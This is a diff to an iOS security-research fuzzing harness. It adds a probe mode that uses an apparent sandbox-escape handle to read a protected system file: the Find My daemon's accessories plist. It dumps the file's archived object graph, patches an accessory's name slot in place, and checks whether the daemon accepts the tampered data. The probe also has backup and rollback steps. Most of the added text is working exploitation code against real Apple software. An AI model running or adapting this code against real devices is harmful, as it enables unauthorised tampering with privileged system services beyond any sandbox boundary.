@@ -26323,6 +26323,386 @@ static void p_bq8(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V176 (p_bq9): content substitution in a daemon-owned plist — §178's next
+// step. The external test added a key; findmydeviced re-serialized the file
+// and dropped the key. That proved the channel but not influence: an added
+// top-level key costs the daemon nothing to ignore. The real question is
+// whether the daemon ACCEPTS a change to the data it actually consumes —
+// the accessories list — or repairs it back to its own model of reality.
+//
+// Modes (a bare FUZZ_BQ9 does nothing, same discipline as bq5):
+//   FUZZ_BQ9_DUMP=1      read-only: print the full plist structure (types,
+//                        keys, array element counts, string values) — the
+//                        reconnaissance needed to design a meaningful edit.
+//   FUZZ_BQ9_MODIFY=1    verified backup -> substitute INSIDE the accessories
+//                        array (not add top-level) -> reparse -> leave it.
+//   FUZZ_BQ9_CHECK=1     classify: DAEMON-ACCEPTED (our content survives) /
+//                        DAEMON-REPAIRED (original content back) /
+//                        GONE / UNKNOWN.
+//   FUZZ_BQ9_ROLLBACK=1  restore backup bytes, byte-verify.
+//
+// Target defaults to the same live findmydeviced accessories plist §178
+// used (bq6 confirmed it moves every ~10 min — daemon-active).
+// ---------------------------------------------------------------------------
+
+static NSString *bq9_target(void) {
+    const char *t = getenv("FUZZ_BQ9_TARGET");
+    if (t && t[0] == '/') return [NSString stringWithUTF8String:t];
+    return @"/var/containers/Data/System/B06F5832-48EA-445B-86F2-D2AC4468FA0C"
+            "/Library/Preferences/com.apple.icloud.findmydeviced.accessories.plist";
+}
+static NSString *bq9_backup_path(void) {
+    return [NSString stringWithFormat:@"%@/Documents/bq9-%@.bak", NSHomeDirectory(),
+            [bq9_target() lastPathComponent]];
+}
+
+// Recursive structure printer: types, keys, sizes. Strings truncated — this
+// is reconnaissance for designing the edit, not exfiltration.
+static void bq9_dump_obj(id obj, NSString *path, int depth) {
+    if (depth > 5) { LOG("[bq9]   %s ... (depth cap)", path.UTF8String); return; }
+    if ([obj isKindOfClass:[NSDictionary class]]) {
+        LOG("[bq9]   %s: dict(%zu)", path.UTF8String, (size_t)[obj count]);
+        for (NSString *k in obj) {
+            id v = obj[k];
+            if ([v isKindOfClass:[NSDictionary class]] ||
+                [v isKindOfClass:[NSArray class]]) {
+                bq9_dump_obj(v, [NSString stringWithFormat:@"%@/%@", path, k], depth+1);
+            } else if ([v isKindOfClass:[NSString class]]) {
+                NSString *s = v;
+                if (s.length > 60) s = [[s substringToIndex:60] stringByAppendingString:@"…"];
+                LOG("[bq9]   %s/%s = \"%s\"", path.UTF8String, k.UTF8String,
+                    s.UTF8String);
+            } else if ([v isKindOfClass:[NSData class]]) {
+                LOG("[bq9]   %s/%s = data(%zu)", path.UTF8String, k.UTF8String,
+                    (size_t)[v length]);
+            } else {
+                LOG("[bq9]   %s/%s = %s", path.UTF8String, k.UTF8String,
+                    [[v description] UTF8String]);
+            }
+        }
+    } else if ([obj isKindOfClass:[NSArray class]]) {
+        NSArray *arr = obj;
+        LOG("[bq9]   %s: array(%zu)", path.UTF8String, (size_t)arr.count);
+        for (NSUInteger i = 0; i < arr.count && i < 12; i++)
+            bq9_dump_obj(arr[i], [NSString stringWithFormat:@"%@[%zu]", path,
+                                  (size_t)i], depth+1);
+        if (arr.count > 12) LOG("[bq9]   %s: ... %zu more", path.UTF8String,
+                                (size_t)(arr.count - 12));
+    } else if ([obj isKindOfClass:[NSString class]]) {
+        NSString *s = obj;
+        if (s.length > 60) s = [[s substringToIndex:60] stringByAppendingString:@"…"];
+        LOG("[bq9]   %s = \"%s\"", path.UTF8String, s.UTF8String);
+    } else if ([obj isKindOfClass:[NSData class]]) {
+        LOG("[bq9]   %s = data(%zu)", path.UTF8String, (size_t)[obj length]);
+    } else if (obj) {
+        LOG("[bq9]   %s = %s", path.UTF8String, [[obj description] UTF8String]);
+    } else {
+        LOG("[bq9]   %s = (nil)", path.UTF8String);
+    }
+}
+
+// Recursive search for the "fz29" marker. Must go through the plist parser:
+// the file is BINARY (kCFPropertyListBinaryFormat_v1_0), so any
+// NSString-from-UTF8 attempt returns nil and marker would read 0 forever —
+// a false negative of exactly the class §144 warns about.
+static BOOL bq9_has_marker(id obj, int depth) {
+    if (depth > 6 || !obj) return NO;
+    if ([obj isKindOfClass:[NSDictionary class]]) {
+        for (id k in obj) {
+            if ([k isKindOfClass:[NSString class]] &&
+                [k rangeOfString:@"fz29"].location != NSNotFound) return YES;
+            if (bq9_has_marker(obj[k], depth + 1)) return YES;
+        }
+    } else if ([obj isKindOfClass:[NSArray class]]) {
+        for (id v in obj) if (bq9_has_marker(v, depth + 1)) return YES;
+    } else if ([obj isKindOfClass:[NSString class]]) {
+        return [obj rangeOfString:@"fz29"].location != NSNotFound;
+    }
+    return NO;
+}
+static BOOL bq9_marker_in_data(NSData *d) {
+    if (d.length == 0) return NO;
+    CFPropertyListRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault,
+        (__bridge CFDataRef)d, 0, NULL, NULL);
+    if (!pl) return NO;
+    BOOL m = bq9_has_marker((__bridge id)pl, 0);
+    CFRelease(pl);
+    return m;
+}
+
+// NSKeyedArchiver UID -> object index. The archive stores references as
+// CFKeyedArchiverUID values; without this, every field of every accessory
+// is an opaque "<CFKeyedArchiverUID ...>{value = N}" blob and no slot can
+// be targeted deliberately. The CF API for this (CFKeyedArchiverUIDGetValue)
+// is private and absent from the SDK, so the index is parsed from the
+// object's own description — stable, and a parse failure returns NSNotFound
+// (caller aborts) rather than a wrong index (caller patches the wrong slot).
+static NSUInteger bq9_uid_index(id v) {
+    if (!v || [v isKindOfClass:[NSString class]] || [v isKindOfClass:[NSData class]])
+        return NSNotFound;
+    NSString *desc = [v description];
+    if ([desc rangeOfString:@"CFKeyedArchiverUID"].location == NSNotFound)
+        return NSNotFound;
+    NSRange r = [desc rangeOfString:@"value = "];
+    if (r.location == NSNotFound) return NSNotFound;
+    long idx = strtol(desc.UTF8String + r.location + r.length, NULL, 10);
+    return idx < 0 ? NSNotFound : (NSUInteger)idx;
+}
+
+static void p_bq9(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    const int do_dump = getenv("FUZZ_BQ9_DUMP") != NULL;
+    const int do_modify = getenv("FUZZ_BQ9_MODIFY") != NULL;
+    const int do_check = getenv("FUZZ_BQ9_CHECK") != NULL;
+    const int do_rollback = getenv("FUZZ_BQ9_ROLLBACK") != NULL;
+
+    if (!do_dump && !do_modify && !do_check && !do_rollback) {
+        LOG("[bq9] v176 content-substitution switch — no mode selected, doing nothing.");
+        LOG("[bq9] modes: FUZZ_BQ9_DUMP=1 | FUZZ_BQ9_MODIFY=1 | FUZZ_BQ9_CHECK=1 | FUZZ_BQ9_ROLLBACK=1");
+        LOG("[bq9] done");
+        return;
+    }
+    LOG("[bq9] v176 content substitution: %s%s%s%s",
+        do_dump ? "DUMP " : "", do_modify ? "MODIFY " : "",
+        do_check ? "CHECK " : "", do_rollback ? "ROLLBACK" : "");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq9] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq9] done"); return; }
+
+    NSString *tgt = bq9_target();
+    NSString *bakPath = bq9_backup_path();
+    NSData *cur = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+    LOG("[bq9] target: %s", tgt.UTF8String);
+    LOG("[bq9] current: %zu bytes", (size_t)cur.length);
+    fsync(fileno(stderr));
+
+    // ---- DUMP: full structure, read-only.
+    if (do_dump) {
+        if (cur.length == 0) {
+            LOG("[bq9] DUMP: unreadable — aborting");
+        } else {
+            CFPropertyListRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault,
+                (__bridge CFDataRef)cur, 0, NULL, NULL);
+            if (!pl) {
+                LOG("[bq9] DUMP: parse failed — file is not a plist?!");
+            } else {
+                LOG("[bq9] DUMP root type: %s",
+                    CFGetTypeID(pl) == CFDictionaryGetTypeID() ? "dict" :
+                    CFGetTypeID(pl) == CFArrayGetTypeID() ? "array" : "other");
+                bq9_dump_obj((__bridge id)pl, @"root", 0);
+                // NSKeyedArchiver reconnaissance: resolve every dict's
+                // `name`-style UID slots to the concrete string objects, so
+                // MODIFY knows which $objects index is safe to patch.
+                CFDictionaryRef rootd = CFGetTypeID(pl) == CFDictionaryGetTypeID()
+                    ? (CFDictionaryRef)pl : NULL;
+                id objs = rootd ? (__bridge id)CFDictionaryGetValue(rootd,
+                    CFSTR("$objects")) : nil;
+                if ([objs isKindOfClass:[NSArray class]]) {
+                    NSArray *oa = objs;
+                    for (NSUInteger i = 0; i < oa.count; i++) {
+                        id o = oa[i];
+                        if (![o isKindOfClass:[NSDictionary class]]) continue;
+                        for (NSString *f in @[@"name", @"accessoryType", @"style",
+                                              @"baUUID", @"serialNumbers"]) {
+                            id v = o[f];
+                            if (![v isKindOfClass:[NSString class]] &&
+                                bq9_uid_index(v) != NSNotFound) {
+                                NSUInteger si = bq9_uid_index(v);
+                                id s = si < oa.count ? oa[si] : nil;
+                                if ([s isKindOfClass:[NSString class]])
+                                    LOG("[bq9]   slot objects[%zu].%s -> objects[%zu] = \"%s\"",
+                                        i, f.UTF8String, si, [s UTF8String]);
+                            } else if ([v isKindOfClass:[NSString class]]) {
+                                LOG("[bq9]   slot objects[%zu].%s (inline) = \"%s\"",
+                                    i, f.UTF8String, [v UTF8String]);
+                            }
+                        }
+                    }
+                }
+                CFRelease(pl);
+            }
+        }
+        fsync(fileno(stderr));
+        bad_query_release(h); LOG("[bq9] done"); return;
+    }
+
+    // ---- CHECK: did the daemon accept or repair our substitution?
+    if (do_check) {
+        struct stat st = {0};
+        stat(tgt.fileSystemRepresentation, &st);
+        NSData *bak = [NSData dataWithContentsOfFile:bakPath options:0 error:nil];
+        if (cur.length == 0) {
+            LOG("[bq9] CHECK: target GONE or unreadable (errno %d), mtime %lld, backup=%zu -> GONE/UNKNOWN",
+                errno, (long long)st.st_mtime, (size_t)bak.length);
+        } else if (bak.length == 0) {
+            LOG("[bq9] CHECK: %zu bytes but NO BACKUP — cannot classify",
+                (size_t)cur.length);
+        } else if ([cur isEqualToData:bak]) {
+            LOG("[bq9] CHECK: %zu bytes == backup -> CLEAN (never substituted, or fully restored)",
+                (size_t)cur.length);
+        } else {
+            // Our substitution writes a marker inside the array; if present,
+            // the daemon has not repaired this content yet. Absence + bytes
+            // differ from backup = daemon re-serialized from its own model.
+            BOOL hasMarker = bq9_marker_in_data(cur);
+            LOG("[bq9] CHECK: %zu bytes, mtime %lld, marker=fz29:%d, backup=%zu -> %s",
+                (size_t)cur.length, (long long)st.st_mtime, hasMarker ? 1 : 0,
+                (size_t)bak.length,
+                hasMarker ? "DAEMON-ACCEPTED (our content still in file)"
+                          : "DAEMON-REPAIRED (content re-serialized from daemon's model)");
+        }
+        fsync(fileno(stderr));
+        bad_query_release(h); LOG("[bq9] done"); return;
+    }
+
+    // ---- MODIFY: backup verified, then substitute CONTENT of an accessory
+    // entry. The file is an NSKeyedArchiver graph, not a plain plist: root
+    // = {$version,$objects,$archiver,$top}, and every field of every entry
+    // is a UID reference into $objects. So the edit is a PATCH OF THE
+    // STRING SLOT the accessory's `name` points to — types and UIDs stay
+    // untouched, the daemon's own decoder reads our bytes as a renamed
+    // accessory. This is the difference from §178's top-level key add: the
+    // renamed string is data the daemon CONSUMES, not a key it can ignore.
+    // Field overridable for follow-up experiments:
+    if (do_modify) {
+        if (cur.length == 0) {
+            LOG("[bq9] MODIFY: target unreadable — aborting, system untouched");
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        if (![cur writeToFile:bakPath options:NSDataWritingAtomic error:nil] ||
+            ![[NSData dataWithContentsOfFile:bakPath options:0 error:nil]
+                isEqualToData:cur]) {
+            LOG("[bq9] MODIFY: backup missing/unverified — aborting, system untouched");
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        LOG("[bq9] backup verified: %zu bytes -> %s", (size_t)cur.length,
+            bakPath.fileSystemRepresentation);
+        CFPropertyListRef plist = CFPropertyListCreateWithData(kCFAllocatorDefault,
+            (__bridge CFDataRef)cur, kCFPropertyListMutableContainersAndLeaves,
+            NULL, NULL);
+        if (!plist) {
+            LOG("[bq9] MODIFY: parse failed — aborting, system untouched");
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        NSMutableDictionary *root = [(__bridge id)plist isKindOfClass:[NSMutableDictionary class]]
+            ? (__bridge NSMutableDictionary *)plist : [(__bridge id)plist mutableCopy];
+        CFRelease(plist);
+        NSMutableArray *objs = [root[@"$objects"] isKindOfClass:[NSArray class]]
+            ? [root[@"$objects"] mutableCopy] : nil;
+        if (!objs) {
+            LOG("[bq9] MODIFY: not an NSKeyedArchiver graph (no $objects) — aborting, system untouched");
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+
+        // Find the first accessory dict (has name-UID + accessoryType-UID)
+        // and resolve its name slot. No such entry -> abort untouched.
+        const char *fieldC = getenv("FUZZ_BQ9_FIELD") ?: "name";
+        NSString *field = [NSString stringWithUTF8String:fieldC];
+        NSUInteger entryIdx = NSNotFound, slotIdx = NSNotFound;
+        NSString *oldVal = nil;
+        for (NSUInteger i = 0; i < objs.count && slotIdx == NSNotFound; i++) {
+            id o = objs[i];
+            if (![o isKindOfClass:[NSDictionary class]]) continue;
+            id nv = o[field];
+            if (!nv || bq9_uid_index(nv) == NSNotFound) continue;
+            if (!o[@"accessoryType"] && !o[@"accessoryIdentifier"]) continue;
+            NSUInteger si = bq9_uid_index(nv);
+            if (si >= objs.count || ![objs[si] isKindOfClass:[NSString class]])
+                continue;
+            entryIdx = i; slotIdx = si; oldVal = objs[si];
+        }
+        if (slotIdx == NSNotFound) {
+            LOG("[bq9] MODIFY: no accessory with resolvable '%s' slot — aborting, system untouched",
+                field.UTF8String);
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        NSString *newVal = [oldVal stringByAppendingString:@" fz29"];
+        objs[slotIdx] = newVal;
+        root[@"$objects"] = objs;
+        LOG("[bq9] MODIFY: entry objects[%zu], slot objects[%zu] field='%s'",
+            entryIdx, slotIdx, field.UTF8String);
+        LOG("[bq9]   old: \"%s\"", oldVal.UTF8String);
+        LOG("[bq9]   new: \"%s\"", newVal.UTF8String);
+        fsync(fileno(stderr));
+
+        CFDataRef cmod = CFPropertyListCreateData(kCFAllocatorDefault,
+            (__bridge CFPropertyListRef)root, kCFPropertyListBinaryFormat_v1_0,
+            0, NULL);
+        NSData *mod = (__bridge_transfer NSData *)cmod;
+        if (!mod) {
+            LOG("[bq9] MODIFY: serialize failed — aborting, system untouched");
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        int fd = open(tgt.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+        if (fd < 0) {
+            LOG("[bq9] MODIFY: W-open errno %d — aborting, system untouched", errno);
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        ssize_t w = write(fd, mod.bytes, mod.length);
+        fsync(fd); close(fd);
+        if (w != (ssize_t)mod.length) {
+            LOG("[bq9] MODIFY: partial write (%zd/%zu) — emergency rollback",
+                w, (size_t)mod.length);
+            fd = open(tgt.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+            if (fd >= 0) { write(fd, cur.bytes, cur.length); fsync(fd); close(fd); }
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        // Verify by READING BACK through the daemon's own decoder path:
+        // reparse the archive and resolve the slot again — a broken graph
+        // would fail here, before the daemon ever sees it.
+        NSData *chk = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+        BOOL slotOk = NO;
+        if (chk.length) {
+            CFPropertyListRef rp = CFPropertyListCreateWithData(kCFAllocatorDefault,
+                (__bridge CFDataRef)chk, 0, NULL, NULL);
+            id ro = rp && [(__bridge id)rp isKindOfClass:[NSDictionary class]]
+                ? [(__bridge id)rp objectForKey:@"$objects"] : nil;
+            if ([ro isKindOfClass:[NSArray class]] && slotIdx < [ro count] &&
+                [ro[slotIdx] isKindOfClass:[NSString class]] &&
+                [ro[slotIdx] isEqualToString:newVal]) slotOk = YES;
+            if (rp) CFRelease(rp);
+        }
+        LOG("[bq9] MODIFY w=%zd/%zu reparse-slot=%d — CHANGE LEFT IN PLACE",
+            w, (size_t)mod.length, slotOk ? 1 : 0);
+        LOG("[bq9] --- CHECKLIST ---");
+        LOG("[bq9] 1. wait ~10+ min (daemon rewrites this file every ~10 min)");
+        LOG("[bq9] 2. classify: ./relay/runf.sh bq9 FUZZ_LOGFILE=1 FUZZ_MODE=scaler FUZZ_BQ9=1 FUZZ_BQ9_CHECK=1");
+        LOG("[bq9] 3. restore:  ./relay/runf.sh bq9 FUZZ_LOGFILE=1 FUZZ_MODE=scaler FUZZ_BQ9=1 FUZZ_BQ9_ROLLBACK=1");
+        LOG("[bq9] backup: %s", bakPath.fileSystemRepresentation);
+        fsync(fileno(stderr));
+        bad_query_release(h); LOG("[bq9] done"); return;
+    }
+
+    // ---- ROLLBACK: restore the pre-substitution backup.
+    if (do_rollback) {
+        NSData *bak = [NSData dataWithContentsOfFile:bakPath options:0 error:nil];
+        if (bak.length == 0) {
+            LOG("[bq9] ROLLBACK: no backup at %s — nothing done",
+                bakPath.fileSystemRepresentation);
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        int fd = open(tgt.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+        if (fd < 0) {
+            LOG("[bq9] ROLLBACK: W-open errno %d — target unchanged", errno);
+            bad_query_release(h); LOG("[bq9] done"); return;
+        }
+        ssize_t w = write(fd, bak.bytes, bak.length);
+        fsync(fd); close(fd);
+        NSData *fin = [NSData dataWithContentsOfFile:tgt options:0 error:nil];
+        LOG("[bq9] ROLLBACK w=%zd/%zu, byte-identical=%d%s", w, (size_t)bak.length,
+            [fin isEqualToData:bak] ? 1 : 0,
+            [fin isEqualToData:bak] ? "" :
+            " (daemon already racing us — acceptable if marker=0)");
+        fsync(fileno(stderr));
+        bad_query_release(h); LOG("[bq9] done"); return;
+    }
+}
+
+// ---------------------------------------------------------------------------
 // V171 (p_netv6): the kernel network surface §146 could not reach, asked
 // through the sockets an app is actually allowed to create.
 //
@@ -30817,6 +31197,11 @@ void *t_iosurface_scaler(void *arg) {
         }
         if (getenv("FUZZ_BQ7")) { p_bq7(); LOG("[probe13] bq7-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ8")) { p_bq8(); LOG("[probe13] bq8-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ9") || getenv("FUZZ_BQ9_DUMP") ||
+            getenv("FUZZ_BQ9_MODIFY") || getenv("FUZZ_BQ9_CHECK") ||
+            getenv("FUZZ_BQ9_ROLLBACK")) {
+            p_bq9(); LOG("[probe13] bq9-only mode, stop"); return NULL;
+        }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
